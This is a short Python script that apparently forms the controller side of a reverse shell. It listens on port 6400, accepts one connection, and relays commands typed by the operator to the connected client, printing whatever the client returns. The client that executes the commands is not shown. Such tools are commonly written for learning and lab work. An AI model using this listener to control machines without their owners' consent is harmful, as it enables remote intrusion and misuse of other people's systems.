import socket
import sys

#Creating Socket
def create_socket():
    try:

        global host
        global port
        global s
        s = socket.socket()
        host = ''
        port = 6400
    
    except socket.error as msg:
        print("Socket Creation Error: " + str(msg))

#Binding Socket and listening to connections
def bind_socket():

    try:
        global host
        global port
        global s
        
        print("Binding the port " + str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("Failed in binding the port with" + str(msg) + "\n" + "Retrying...")
        bind_socket()
        
#Accepting connections
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established" + "IP: " + address[0] + " Port: " + str(address[1]))
    send_commands(conn)
    conn.close()

# Send commands over the network to the client.
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit()': #Exit procedure.
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0: #Checks for input to avoid sending blanks
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()
